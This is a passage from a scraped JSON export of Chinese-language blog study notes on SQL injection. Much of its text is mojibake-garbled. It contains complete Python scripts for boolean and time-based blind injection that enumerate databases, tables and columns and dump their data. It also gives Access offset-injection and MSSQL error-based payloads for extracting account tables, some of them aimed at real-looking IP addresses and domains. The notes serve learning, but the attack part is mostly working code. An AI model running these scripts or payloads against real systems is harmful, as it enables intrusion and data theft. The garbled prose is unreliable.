dump_data_list = [] dump_data = &#x27;&#x27; for i in column_name_list: for j in range(data_num): while True: dump_data_length_payload = url + &quot; and if(ascii(substr((select %s from %s.%s limit %d,1),%d,1)),sleep(2),1) --+&quot; % ( i, db_name, tb_name, j, k) # print(dump_data_length_payload) start_time = time.time() r = requests.get(dump_data_length_payload) if time.time() - start_time &lt; 2: dump_data_length = k - 1 k = 1 break else: k += 1 data_length.append(dump_data_length) for l in range(1, dump_data_length + 1): max = 127 min = 33 while abs(max - min) &gt; 1: midx = int((max + min) / 2) dump_data_payload = url + &quot; and if(ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % ( i, db_name, tb_name, j, l, midx) # print(dump_data_payload) start_time = time.time() r = requests.get(dump_data_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx dump_data += chr(max) # print(dump_data) dump_data_list.append(dump_data) dump_data = &#x27;&#x27; # print( dump_data_list) print(&quot;[+]%sæ•°æ®åº“çš„%sè¡¨çš„æ•°æ®:&quot; % (db_name, tb_name)) j = 0 num_1 = len(dump_data_list) // data_num for i in range(data_num): j = i for k in range(num_1): print(&quot;%s\\t\\t&quot; % dump_data_list[j], end=&#x27;&#x27;) j = i + data_num print()def re(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;å¦‚éœ€è·‘å…¶ä»–è¡¨,è¯·è¾“å…¥ä»»æ„å­—ç¬¦,å¦åˆ™è¾“å…¥No(ä¾‹å¦‚ admin):&quot;) if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;: break else: print(tb_name_list) column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name) dump_data(url, str, tb_name, db_name, column_name_list)url = input(&quot;è¯·è¾“å…¥URL:&quot;) # ç›®æ ‡url http://127.0.0.1/sqli/Less-5/?id=1url = close(url)ascii_list = db_ascii_list()db_name = db_name(url, str, ascii_list)tb_name_list = tb_name(url, str, ascii_list, db_name)column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)dump_data(url, str, tb_name, db_name, column_name_list)re(url, str, ascii_list, tb_name_list, db_name) åŸºäºå¸ƒå°”çš„SQLç›²æ³¨-é€»è¾‘åˆ¤æ–­ä¸€èˆ¬éƒ½ç”¨è„šæœ¬è·‘ é¡µé¢åªè¿”å›Trueå’ŒFalseä¸¤ç§ç±»å‹é¡µé¢ã€‚åˆ©ç”¨é¡µé¢è¿”å›ä¸åŒï¼Œé€ä¸ªçŒœè§£æ•°æ®ã€‚ä¹Ÿå¯ä»¥ç”¨æ—¶é—´ç›²æ³¨ æŸ¥æ•°æ®åº“åé•¿åº¦ï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªè¯• 1http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())=8 --+ è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224import requestsdef close(url): s = input(&quot;è¯·è¾“å…¥é—­åˆæ–¹å¼:&quot;) url = url + s return urldef db_ascii_list(): ascii_list = [] for i in range(33, 127): ascii_list.append(chr(i)) return ascii_list# çˆ†ç ´æ•°æ®åº“ådef db_name(url, str, ascii_list): print(&quot;[-]å¼€å§‹çˆ†ç ´æ•°æ®åº“å.......&quot;) num = 1 while True: db_payload = url + &quot; and length(database())=%d --+&quot; % num r = requests.get(db_payload) if str in r.text: db_length = num break else: num += 1 db_name = &#x27;&#x27; for i in range(1, db_length + 1): for j in ascii_list: db_name_payload = url + &quot; and ord(mid((database()),%d,1))=%d --+&quot; % (i, ord(j)) # print(db_name_payload) r = requests.get(db_name_payload) if str in r.text: db_name += j break else: pass print(&quot;[+]æ•°æ®åº“åï¼š%s\\n&quot; % db_name) return db_name# çˆ†ç ´è¡¨ådef tb_name(url, str, ascii_list, db_name): print(&quot;[-]å¼€å§‹çˆ†ç ´è¡¨å&quot;) i = 1 while True: tb_payload = url + &quot; and (select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d --+&quot; % ( db_name, i) # print(tb_payload) r = requests.get(tb_payload) if str in r.text: tb_number = i break else: i += 1 j = 1 tb_name_length = [] for i in range(tb_number): while True: tb_name_length_payload = url + &quot; and (select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % ( db_name, i, j) # print(tb_name_length_payload) r = requests.get(tb_name_length_payload) if str in r.text: tb_name_length.append(j) j = 1 break else: j += 1 tb_name_list = [] for i in range(tb_number): tb_name = &#x27;&#x27; for j in range(1, tb_name_length[i] + 1): for k in ascii_list: tb_name_payload = url + &quot; and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % ( db_name, i, j, ord(k)) r = requests.get(tb_name_payload) # print(tb_name_payload) if str in r.text: tb_name += k break else: pass tb_name_list.append(tb_name) print(&quot;\\n[+]%såº“ä¸‹çš„%då¼ è¡¨ä¸ºï¼š%s\\n&quot; % (db_name, tb_number, tb_name_list)) return tb_name_listdef column_name(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;è¯·è¾“å…¥ä½ é€‰æ‹©çš„è¡¨å(ä¾‹å¦‚ admin):&quot;) if tb_name in tb_name_list: break else: print(&quot;è¾“å…¥çš„è¡¨åæœ‰è¯¯,è¯·é‡æ–°è¾“å…¥&quot;) j = 1 while True: column_num_payload = url + &quot; and (select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d --+&quot; % ( tb_name, db_name, j) # print(column_num_payload) r = requests.get(column_num_payload) if str in r.text: column_num = j break else: j += 1 column_name_length = [] k = 1 for i in range(column_num): while True: column_name_length_payload = url + &quot; and (select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % ( tb_name, i, k) # print(column_name_length_payload) r = requests.get(column_name_length_payload) if str in r.text: column_name_length.append(k) k = 1 break else: k += 1 print(&quot;[-]å¼€å§‹çˆ†ç ´%sè¡¨çš„å­—æ®µå:&quot; % tb_name) column_name_list = [] for i in range(len(column_name_length)): column_name = &#x27;&#x27; for j in range(1, column_name_length[i] + 1): for k in ascii_list: column_name_payload = url + &quot; and ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % ( tb_name, i, j, ord(k)) # print(column_name_payload) r = requests.get(column_name_payload) if str in r.text: column_name += k break else: pass column_name_list.append(column_name) print(&quot;[+]%sè¡¨çš„å­—æ®µååˆ†åˆ«ä¸º:%s&quot; % (tb_name, column_name_list)) return column_name_list, tb_namedef dump_data(url, str, tb_name, db_name, column_name_list): i = 1 while True: data_num_payload = url + &quot; and (select count(*) from %s.%s)=%d --+&quot; % (db_name, tb_name, i) # print(data_num_payload) r = requests.get(data_num_payload) if str in r.text: data_num = i break else: i += 1 print(&quot;[-]å¼€å§‹çˆ†ç ´%sæ•°æ®åº“çš„%sè¡¨ä¸­æ•°æ®:&quot; % (db_name, tb_name)) k = 1 data_length = [] dump_data_list = [] dump_data = &#x27;&#x27; for i in column_name_list: for j in range(data_num): while True: dump_data_length_payload = url + &quot; and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) --+&quot; % ( i, db_name, tb_name, j, k) # print(dump_data_length_payload) r = requests.get(dump_data_length_payload) if str not in r.text: dump_data_length = k - 1 k = 1 break else: k += 1 data_length.append(dump_data_length) for l in range(1, dump_data_length + 1): max = 127 min = 33 while abs(max - min) &gt; 1: midx = int((max + min) / 2) dump_data_payload = url + &quot; and ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d --+&quot; % ( i, db_name, tb_name, j, l, midx) # print(dump_data_payload) r = requests.get(dump_data_payload) if str in r.text: min = midx else: max = midx dump_data += chr(max) dump_data_list.append(dump_data) dump_data = &#x27;&#x27; # print( dump_data_list) print(&quot;[+]%sæ•°æ®åº“çš„%sè¡¨çš„æ•°æ®:&quot; % (db_name, tb_name)) j = 0 num_1 = len(dump_data_list) // data_num for i in range(data_num): j = i for k in range(num_1): print(&quot;%s\\t\\t&quot; % dump_data_list[j], end=&#x27;&#x27;) j = i + data_num print()def re(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;å¦‚éœ€è·‘å…¶ä»–è¡¨,è¯·è¾“å…¥ä»»æ„å­—ç¬¦,å¦åˆ™è¾“å…¥No(ä¾‹å¦‚ admin):&quot;) if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;: break else: print(tb_name_list) column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name) dump_data(url, str, tb_name, db_name, column_name_list)url = input(&quot;è¯·è¾“å…¥URL:&quot;) # ç›®æ ‡url http://127.0.0.1/sqli/Less-5/?id=1str = input(&quot;è¯·è¾“å…¥æ­£ç¡®é¡µé¢è¿”å›å­—ç¬¦ä¸²:&quot;) # å¸ƒå°”å‹ç›²æ³¨çš„true&amp;falseçš„åˆ¤æ–­å› ç´  You are inurl = close(url)ascii_list = db_ascii_list()db_name = db_name(url, str, ascii_list)tb_name_list = tb_name(url, str, ascii_list, db_name)column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)dump_data(url, str, tb_name, db_name, column_name_list)re(url, str, ascii_list, tb_name_list, db_name) æ¶‰åŠèµ„æº12345https://www.jianshu.com/p/bc35f8dd4f7chttps://www.jianshu.com/p/fcae21926e5chttps://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g æå–ç ï¼šl9f6","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"15WEBæ¼æ´--SQLæ³¨å…¥ä¹‹Oracleã€MongoDBæ³¨å…¥","slug":"15WEBæ¼æ´-SQLæ³¨å…¥ä¹‹Oracleã€MongoDBæ³¨å…¥","date":"2021-09-21T02:29:13.000Z","updated":"2021-09-21T06:05:24.391Z","comments":true,"path":"2021/09/21/15WEBæ¼æ´-SQLæ³¨å…¥ä¹‹Oracleã€MongoDBæ³¨å…¥/","link":"","permalink":"https://al0nez.github.io/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† æ•°æ®åº“Accessï¼Œmysqlï¼ŒmongoDBï¼Œpostsqlï¼Œsqliteï¼Œoracleï¼Œsybaseç­‰ mysql mssqlç­‰ 123456æ•°æ®åº“A è¡¨å åˆ—å æ•°æ®æ•°æ®åº“B ........... Access 12345 è¡¨å åˆ—åæ•°æ® accessæ•°æ®åº“æ²¡æœ‰æ•°æ®åº“åï¼Œæ•°æ®åº“ä¼šä¿å­˜åœ¨ç½‘ç«™æºç ä¸‹é¢ï¼Œæ•°æ®åº“æ˜¯ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œè·¨åº“æ³¨å…¥ï¼Œaccessæ²¡æœ‰å‘å…¶ä»–æ•°æ®åº“ä¸€æ ·çš„åŠŸèƒ½ï¼Œæ²¡æœ‰æ–‡ä»¶è¯»å†™çš„åŠŸèƒ½ã€‚ ä»€ä¹ˆå†³å®šç½‘ç«™æ³¨å…¥ç‚¹ç”¨æˆ·æƒé™ï¼Ÿæ•°æ®åº“é…ç½®æ–‡ä»¶çš„ç”¨æˆ·ï¼Œæ˜¯è°è¿æ¥çš„ ç®€è¦å­¦ä¹ å„ç§æ•°æ®åº“çš„æ³¨å…¥ç‰¹ç‚¹æ•°æ®åº“æ¶æ„ç»„æˆï¼Œæ•°æ®åº“é«˜æƒé™æ“ä½œ Accessæ³¨å…¥æ­£å¸¸æƒ…å†µä¸‹ï¼Œaccessæ³¨å…¥éœ€è¦é€šè¿‡çŒœè§£è¡¨åå’Œå­—æ®µåå»æ³¨å…¥ã€‚ åˆ¤æ–­æ³¨å…¥ç‚¹123http://219.153.49.228:47744/new_list.asp?id=1&#x27; #é¡µé¢æŠ¥é”™http://219.153.49.228:47744/new_list.asp?id=1 and 1=1 #é¡µé¢æ­£å¸¸http://219.153.49.228:47744/new_list.asp?id=1 and 1=2 #é¡µé¢æŠ¥é”™ è¯´æ˜æ˜¯æ•°å­—å‹æ³¨å…¥ åˆ¤æ–­æ˜¯ä¸æ˜¯accessæ•°æ®åº“12è‹¥å¸¦å…¥ and (select count(*) from msysobjects)&gt;0 ç”±äºmsysobjectsè¡¨åœ¨accessæ•°æ®åº“ä¸­æ— æƒè®¿é—®æ‰€ä»¥è¿”å›é”™è¯¯--ä¸ºaccessæ•°æ®åº“ å› ä¸ºaccessæ•°æ®åº“æœ‰æ—¶å€™æ·»åŠ ä¸Šé¢çš„è¯­å¥å°±æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“æ˜¯ä¸æ˜¯accessæ•°æ®åº“ï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹æ®è„šæœ¬è¯­è¨€åˆ¤æ–­ å¦‚æœè¯­è¨€ä¸ºasp,åŸºæœ¬å°±æ˜¯accessæ•°æ®åº“ï¼Œaspxå¯èƒ½æ˜¯mssqlå¾ˆå°‘æ˜¯accessã€‚æ‰€ä»¥æˆ‘ä»¬è¦åˆ¤æ–­æ˜¯ä¸æ˜¯accessæ•°æ®åº“ã€‚åªéœ€è¦çœ‹æ˜¯ä¸æ˜¯asp è¯­è¨€ï¼Œå¦‚æœæ˜¯aspxå°±åˆ¤æ–­ä»–æ˜¯ä¸æ˜¯MSSQLæ•°æ®åº“å³å¯ã€‚ 1234#è‹¥å¸¦å…¥and (select count(*) from sysobjects)&gt;0 #ç”±äºsysobjectsè¡¨åœ¨MSSQLæ•°æ®åº“ä¸­å¯ä»¥æ­£å¸¸è®¿é—®æ‰€ä»¥å½“è¿”å›æ­£å¸¸é¡µé¢æ—¶è¡¨ç¤ºä¸ºMSSQLæ•°æ®åº“http://219.153.49.228:43394/new_list.asp?id=1 and (select count(*) from sysobjects)&gt;0 #é”™è¯¯è¡¨ç¤ºä¸æ˜¯mssql,è€Œæ˜¯accessã€æ•°æ®åº“ è”åˆæ³¨å…¥å¦‚æœæœ‰å›æ˜¾çš„è¯å¯ä»¥ç”¨è”åˆæ³¨å…¥,æ— å›æ˜¾å°±ç”¨ç›²æ³¨ order by è¯­å¥åˆ¤æ–­åˆ—æ•° 1http://219.153.49.228:47744/new_list.asp?id=1 order by 4 çŒœè§£è¡¨åå› ä¸ºæˆ‘ä»¬å·²ç»çŸ¥é“å­—æ®µæ•°äº†ï¼Œæ‰€ä»¥å‰©ä¸‹çš„å°±æ˜¯è¡¨åäº†ï¼Œè¿™ä¸ªéœ€è¦è‡ªå·±å»çŒœï¼Œæˆ–è€…ä½¿ç”¨å·¥å…·è·‘ï¼Œæ­£ç¡®å°±ä¼šè¿”å›å›æ˜¾çš„ä½ç½®ï¼Œé”™è¯¯å°±ä¼šæŠ¥é”™ 1http://219.153.49.228:43394/new_list.asp?id=1 union select 1,2,3,4 from admin(è‡ªå·±çŒœæµ‹çš„) 1http://219.153.49.228:43394/new_list.asp?id=1 and exists (select * from admin) #åˆ¤æ–­æŸ¥è¯¢ç»“æœæ˜¯å¦å­˜åœ¨ çŒœè§£åˆ—åç„¶åå°±æ˜¯çŒœåˆ—åï¼Œä¸€é¡¿çŒœã€‚ã€‚ 1http://219.153.49.228:43394/new_list.asp?id=1 union select 1,username,passwd,4 from admin(è‡ªå·±çŒœæµ‹çš„) ä¹Ÿå¯ä»¥è¿™æ ·çŒœï¼Œç›²æ³¨ä¸€èˆ¬ç”¨è¿™ä¸ªï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ã€‚ 12http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id from admin) #é¡µé¢è¿”å›æ­£å¸¸è¡¨ç¤ºå­˜åœ¨http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id,username from admin) #é¡µé¢è¿”å›æ­£å¸¸è¡¨ç¤ºå­˜åœ¨ åç§»æ³¨å…¥åç§»æ³¨å…¥ä¸»è¦æ˜¯é’ˆå¯¹çŸ¥é“è¡¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å­—æ®µçš„ã€‚ è¿™é‡Œæˆ‘å·²ç»çŸ¥é“äº†è¡¨æ˜æ˜¯ï¼šsys_admin å¯ä»¥ä½¿ç”¨ï¼š 1select exists(selct * from sys_admin); æ¥çŒœæµ‹æ˜¯å¦æœ‰sys_adminè¡¨ï¼Œå¦‚æœè¯´å­˜åœ¨çš„è¯é¡µé¢å°±ä¼šæ˜¾ç¤ºæ­£å¸¸ã€‚ 00x1 åˆ¤æ–­å­—æ®µæ•° 12http://www.test.com/newslist.asp?id=688 order by 19 #é”™è¯¯http://www.test.com/newslist.asp?id=688 order by 18 #æ­£ç¡® 00x2 çˆ†å‡ºæ˜¾ç¤ºä½ 1http://www.fdsp-reme.com/newslist.asp?id=688 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sys_admin 00x3 åˆ¤æ–­è¡¨å†…å­˜åœ¨çš„å­—æ®µæ•° æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨â€œâ€ä»£æ›¿adminè¡¨å†…å­˜åœ¨çš„å­—æ®µï¼Œç”±äºæ˜¯18ä¸ªå­—æ®µæ•°ï¼Œéœ€è¦é€æ­¥æµ‹è¯•ï¼Œç›´åˆ°è¿”å›æ­£å¸¸ã€‚è¿™é‡Œâ€â€œä¹Ÿå¯ä»¥ä½¿ç”¨sys_admin.*ä»£æ›¿ 1234http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin #é”™è¯¯http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin #é”™è¯¯http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin #é”™è¯¯ç›´åˆ°.........http://www.test.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #æ­£ç¡® 18-11=7ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜sys_adminè¡¨æœ‰7ä¸ªå­—æ®µ åç§»æ³¨å…¥çš„åŸºæœ¬å…¬å¼ä¸º: â€‹ order by å‡ºçš„å­—æ®µæ•°å‡å»å·çš„å­—æ®µæ•°ï¼Œç„¶è€Œå†ç”¨order byçš„å­—æ®µæ•°å‡å»*2å€åˆšæ‰å¾—å‡ºæ¥çš„ç­”æ¡ˆ ä¹Ÿå°±æ˜¯18-11=7 18-7*2=4 å¾—åˆ°ç­”æ¡ˆç­‰äºï¼š4 ç„¶åä¾æ—§æ˜¯å¥—å…¬å¼çš„è¿‡ç¨‹ã€‚ è¿™é‡Œçš„idå¿…é¡»æ˜¯å­˜åœ¨çš„ã€‚ä¹Ÿæ˜¯å°±è¯´å¿…é¡»è¦çŸ¥é“ä¸€ä¸ªå­—æ®µï¼Œæ‰€ä»¥è¦é è¿æ°”ã€‚ 1234http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)#è¿™é‡Œunion select 1,2,3,4ï¼šé¡¾åæ€ä¹‰å°±æ˜¯åˆšæ‰å¾—å‡ºæ¥çš„é•¿åº¦ã€‚#åé¢çš„æ˜¯sqlï¼Œå¯ä½œå…¬å¼ã€‚ å¦‚æ­¤ä¾¿çˆ†å‡ºäº†è´¦å·å¯†ç ã€‚ ä½†æ˜¯æˆ‘æµ‹è¯•çš„è¿™ä¸ªç½‘ç«™ï¼Œç•¥å¾®æœ‰ç‚¹ç‰¹æ®Šã€‚å¦‚ä¸‹å›¾æ‰€ç¤º SQL server/MSSQLæ³¨å…¥â‘ åˆ¤æ–­æ•°æ®åº“ç±»å‹ 12and exists (select * from sysobjects)--è¿”å›æ­£å¸¸ä¸ºmssqlï¼ˆä¹Ÿåsql serverï¼‰and exists (select count(*) from sysobjects)--æœ‰æ—¶ä¸Šé¢é‚£ä¸ªè¯­å¥ä¸è¡Œå°±è¯•è¯•è¿™ä¸ªå“ˆ â‘¡åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬ 123and 1=@@version--è¿™ä¸ªè¯­å¥è¦åœ¨æœ‰å›æ˜¾çš„æ¨¡å¼ä¸‹æ‰å¯ä»¥å“¦and substring((select @@version),22,4)=&#x27;2008&#x27;--é€‚ç”¨äºæ— å›æ˜¾æ¨¡å¼ï¼Œåé¢çš„2008å°±æ˜¯æ•°æ®åº“ç‰ˆæœ¬ï¼Œè¿”å›æ­£å¸¸å°±æ˜¯2008çš„å¤åˆ¶ä»£ç ç¬¬ä¸€æ¡è¯­å¥æ‰§è¡Œæ•ˆæœå›¾ï¼ˆç±»ä¼¼ï¼‰ï¼šç¬¬äºŒæ¡è¯­å¥æ‰§è¡Œæ•ˆæœå›¾ï¼šï¼ˆå¦‚æœæ˜¯2008çš„è¯å°±è¿”å›æ­£å¸¸ï¼‰ â‘¢è·å–æ‰€æœ‰æ•°æ®åº“çš„ä¸ªæ•° (ä¸€ä¸‹3æ¡è¯­å¥å¯ä¾›é€‰æ‹©ä½¿ç”¨) 1234561. and 1=(select quotename(count(name)) from master..sysdatabases)--2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --3. and 1=(select str(count and 1=(select quotename(count(name)) from master..sysdatabases where dbid&gt;5)-- and 1=(select str(count(name))%2b&#x27;|&#x27; from master..sysdatabases where dbid&gt;5) -- and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --è¯´æ˜ï¼šdbidä»1-4çš„æ•°æ®åº“ä¸€èˆ¬ä¸ºç³»ç»Ÿæ•°æ®åº“. â‘¤è·å–æ•°æ®åº“ ï¼ˆè¯¥è¯­å¥æ˜¯ä¸€æ¬¡æ€§è·å–å…¨éƒ¨æ•°æ®åº“çš„ï¼Œä¸”è¯­å¥åªé€‚åˆ&gt;=2005ï¼Œä¸¤æ¡è¯­å¥å¯ä¾›é€‰æ‹©ä½¿ç”¨ï¼‰ 12and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from master..sysdatabases FOR XML PATH(&#x27;&#x27;))-- â‘¥è·å–å½“å‰æ•°æ®åº“ 12and db_name()&gt;0and 1=(select db_name())-- â‘¦è·å–å½“å‰æ•°æ®åº“ä¸­çš„è¡¨ï¼ˆæœ‰2ä¸ªè¯­å¥å¯ä¾›é€‰æ‹©ä½¿ç”¨ï¼‰ã€ä¸‹åˆ—è¯­å¥å¯ä¸€æ¬¡çˆ†æ•°æ®åº“æ‰€æœ‰è¡¨ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰ã€‘ 123and 1=(select quotename(name) from æ•°æ®åº“å..sysobjects where xtype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))-- and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from æ•°æ®åº“å..sysobjects where xtype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))--å¤åˆ¶ä»£ç æµ‹è¯•æ•ˆæœå›¾ï¼šå¾—åˆ° 3ä¸ªæ•æ„Ÿçš„è¡¨ï¼šWhir_Sec_Users/Whir_Mem_Member/Whir_Mem_MemberGroup â‘§è·å¾—è¡¨é‡Œçš„åˆ— 123ä¸€æ¬¡çˆ†æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰:and 1=(select quotename(name) from æ•°æ®åº“å..syscolumns where id =(select id from æ•°æ®åº“å..sysobjects where name=&#x27;æŒ‡å®šè¡¨å&#x27;) FOR XML PATH(&#x27;&#x27;))-- and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from æ•°æ®åº“å..syscolumns where id =(select id from æ•°æ®åº“å..sysobjects where name=&#x27;æŒ‡å®šè¡¨å&#x27;) FOR XML PATH(&#x27;&#x27;))-- æ•ˆæœå›¾ï¼šæ—¢ç„¶æœ‰è´¦æˆ·ä¿¡æ¯ï¼Œæˆ‘å°±ä¸ç®¡æ˜¯ä¸æ˜¯ç®¡ç†å‘˜çš„çš„äº†ï¼Œæˆ‘å¸–å­çš„ç›®çš„ä¸æ˜¯ä¸ºäº†å¾—åˆ°ç®¡ç†å‘˜çš„ä¿¡æ¯ï¼Œåªæ˜¯ä¸ºäº†æ¼”ç¤ºå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–ç›¸å…³ä¿¡æ¯ã€‚ â‘¨è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨çš„åˆ—çš„æ•°æ®åº“ 123456789101112é€æ¡çˆ†æŒ‡å®šè¡¨çš„æ‰€æœ‰å­—æ®µçš„æ•°æ®ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰:and 1=(select top 1 * from æŒ‡å®šæ•°æ®åº“..æŒ‡å®šè¡¨å whereæ’é™¤æ¡ä»¶ FOR XML PATH(&#x27;&#x27;))--ä¸€æ¬¡æ€§çˆ†Næ¡æ‰€æœ‰å­—æ®µçš„æ•°æ®ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰:and 1=(select top N * from æŒ‡å®šæ•°æ®åº“..æŒ‡å®šè¡¨å FOR XML PATH(&#x27;&#x27;))--å¤åˆ¶ä»£ç ç¬¬ä¸€æ¡è¯­å¥ï¼šand 1=(select top 1 * from æŒ‡å®šæ•°æ®åº“..æŒ‡å®šè¡¨å FOR XML PATH(&#x27;&#x27;))--æµ‹è¯•æ•ˆæœå›¾ï¼š----------------------------------åŠ ä¸Šwhereæ¡ä»¶ç­›é€‰ç»“æœå‡ºæ¥ä¼šæ›´åŠ å¥½ï¼Œå¦‚ï¼šwhere and name like &#x27;%user%&#x27; å°±ä¼šç­›é€‰å‡ºå«æœ‰userå…³é”®è¯çš„å‡ºæ¥ã€‚ç”¨åœ¨ç­›é€‰è¡¨æ®µæ—¶å¾ˆä¸é”™ã€‚ æ³¨æ„ï¼šåœ¨ä½¿ç”¨ä¸€æ¬¡è·å–æ•°æ®åº“ä¿¡æ¯çš„è¯­å¥æ—¶ï¼Œè¯·ä½¿ç”¨ç«ç‹æµè§ˆå™¨ï¼Œç¬”è€…æµ‹è¯• IE8ã€360æ€¥é€Ÿæµè§ˆå™¨ã€çŒè±¹æµè§ˆå™¨å‡å¡æ­»ï¼Œç«ç‹æµè§ˆå™¨ä¹Ÿä¼šå¯¼è‡´å‡ºç°å‡ ç§’é’Ÿçš„å¡æ­»ï¼Œå¼¹å‡ºæ¡†æ¡†ï¼Œæˆ‘ä»¬ç‚¹å‡»â€œåœæ­¢è„šæœ¬â€å°±ä¼šå¾—åˆ°åˆæ­¥è§£å†³ã€‚ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å¾—åˆ°äº†è´¦æˆ·ä¿¡æ¯äº†ï¼Œè‡³äºç®¡ç†å‘˜çš„å‘¢ï¼Œå“ˆå“ˆï¼Œå¤§å®¶è‡ªè¡Œæµ‹è¯•æ—¶æ¢è¡¨å•¥çš„å°±å¥½äº†ã€‚ PostgraSQLæ³¨å…¥åŸç†ç›´æ¥å‚è€ƒè¿™ä¸ªï¼Œæ²¡å¿…è¦è®°ä½ï¼Œèƒ½çœ‹æ‡‚å°±è¡Œ 123https://www.webshell.cc/524.htmlhttps://www.cnblogs.com/yilishazi/p/14710349.htmlhttps://www.jianshu.com/p/ba0297da2c2e Oracleæ³¨å…¥1https://www.cnblogs.com/peterpan0707007/p/8242119.html MongoDBæ³¨å…¥12https://blog.csdn.net/weixin_33881753/article/details/87981552https://www.secpulse.com/archives/3278.html Sqlmapsqlmapæ”¯æŒçš„æ•°æ®åº“MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybaseå’ŒSAP MaxDB å‚æ•°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576åŸºæœ¬æ“ä½œç¬”è®°ï¼š-u #æ³¨å…¥ç‚¹ -f #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹ -b #è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ -p 